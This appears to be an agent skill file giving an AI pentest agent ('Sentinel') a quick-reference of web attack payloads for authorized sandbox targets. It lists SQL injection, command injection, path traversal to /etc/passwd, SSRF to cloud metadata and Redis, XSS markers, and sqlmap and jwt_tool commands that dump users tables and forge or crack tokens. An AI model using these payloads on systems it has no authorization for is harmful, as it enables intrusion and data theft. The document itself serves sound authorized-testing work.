---
name: sentinel-payloads
description: Compact curated payload reference for the Sentinel agent - SQL injection, XSS, command injection, SSRF, path traversal quick lists for authorized-target probing. Use during active probe phases when constructing evidence-grade requests.
---

# Sentinel payload quick-reference

Lean set tuned for EVIDENCE-GRADE probing (confirm-or-deny, not spray).
Full libraries: SecLists (github.com/danielmiessler/SecLists). Rate-limit all.

## SQL injection (confirmation-grade)

```
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL,NULL,NULL--
1' AND SLEEP(3)--            (time-based; observe ~3s delay)
1 AND 1=CAST((SELECT current_database()) AS INT)--   (error-based PG)
```
Confirm = auth bypass, data in response, or deterministic timing delta.
Record exact request + response snippet.

## Command injection

```
; id
$(id)
`id`
| id
& sleep 5 &
```
Confirm = command output in response OR consistent timing delta. Note context
(quote-closed? piped?).

## Path traversal

```
../../../../etc/passwd
..\/..\/..\/etc/passwd
....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
```
Confirm = root:x:0:0 or known file content returned. SPA fallbacks returning
index.html are NOT traversal — validate content, not status alone.

## SSRF

```
http://127.0.0.1:<port>
http://169.254.169.254/latest/meta-data/
file:///etc/passwd
gopher://127.0.0.1:6379/_%2BINFO%2B
```
Only where target fetches URLs by design. NEVER actually contact cloud
metadata from your own tooling — the guard hard-denies it; if a TARGET's
response indicates it fetched metadata, that is the finding (report what the
target did, do not repeat it).

## XSS (confirmation via marker, not alert())

```
"><script>console.log('SENTINEL_MARKER')</script>
<img src=x onerror="console.log('SENTINEL_MARKER')">
{{7*7}}          (template engines)
${7*7}           (EL/template variants)
```
Confirm = marker reflected unencoded in response body, or template math
evaluated. Console.log markers avoid side effects vs alert().

## Tool-backed recipes (prebaked image; embed SENTINEL_GRANT)

Prefer these over hand-rolled payloads once a vuln class is suspected — they
produce reproducible artifacts that clear the 5-check gate faster.

```bash
# SQLi (DVWA/Juice Shop/VAmPI/DSVW) — dump proof, not just detect
sqlmap -u "<url>?id=1" --batch --level=2 --risk=2 --dbs --output-dir=artifacts/sqlmap
sqlmap -u "<url>" --data="username=a&password=b" --batch --dump -T users --output-dir=artifacts/sqlmap

# JWT — RS256->HS256 confusion (Juice Shop admin forgery), none-alg, weak-secret
jwt_tool <token> -X k -pk artifacts/pubkey.pem      # key confusion
jwt_tool <token> -X a                               # alg:none
jwt_tool <token> -C -d /usr/share/wordlists/*.txt   # crack weak HMAC secret

# Params / hidden endpoints / dir brute
arjun -u "<url>" -oJ artifacts/arjun.json           # discover hidden params
ffuf -u "<url>/FUZZ" -w <wordlist> -o artifacts/ffuf.json
gobuster dir -u "<url>" -w <wordlist> -o artifacts/gobuster.txt

# XSS at scale (reflected/DOM sink discovery)
dalfox url "<url>?q=FUZZ" -o artifacts/dalfox.txt

# Template scan + TLS
nuclei -u "<url>" -severity low,medium,high,critical -rl 20 -o artifacts/nuclei.txt
testssl.sh --quiet --jsonfile artifacts/testssl.json "<host>:443"
```

## Usage rules

- One payload class per probe batch; log every request to artifacts.
- Any payload that could modify target state (POST/PUT) requires its own grant.
- Injection attempts against the SENTINEL pipeline itself (scope-guard,
  harness) are impossible by construction — payloads here are only for the
  scoped target inside the sandbox.
